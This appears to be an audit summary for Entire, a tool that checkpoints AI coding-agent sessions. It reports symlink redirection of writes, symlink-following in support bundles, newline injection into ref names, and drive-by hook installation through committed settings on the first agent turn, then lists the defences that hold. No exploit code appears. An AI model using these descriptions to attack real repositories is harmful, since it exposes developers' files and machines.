Repo-committed symlinks redirect Entire's writes outside the repo, and the strongest instance fires on **every turn** via `EnsureEntireGitignore`, needing nothing but a clone and opening an agent. `doctor bundle` follows symlinks under `.entire/logs`, pulling arbitrary files into the zip users email to support. A malicious server can inject `\n` into an advertised ref name and plant a forged push result. And drive-by activation ties it together: a committed settings file with `"enabled": true` plus a repo-local agent hook config installs git hooks on the first agent turn — the victim never runs `entire enable`.

Dependencies are clean: `govulncheck` reports zero vulnerabilities in called code.

## What's genuinely solid

Not padding, and worth knowing so you don't re-hunt it: the OPF size caps all fail closed correctly, chunking runs after redaction, trailer forgery isn't reachable, the v1 ref uses a proper CAS, PKCE and the OAuth flow are well built (S256-only, state validated before redemption, and issuer adoption rejects both `auth.entire.io.evil.com` and `xauth.entire.io`), zip-slip is closed architecturally, session-ID and checkpoint-ID validation is applied at all 30+ path-building sites, force-push and history destruction don't exist on any push path, and hook bodies are generated from constants. ReDoS is ruled out — everything in `redact/` is RE2.

Several findings are one-line fixes on code whose author clearly understood the threat already: `hasTerminalControlChars` exists but isn't applied to settings, `confirmUntrustedIssueSeed` gates a *further-away* untrusted source than the one that needs it, and `gitrepo/reftable.go` uses `--end-of-options` correctly while the checkpoint git wrapper doesn't. The gap is consistency of application, not absence of understanding.
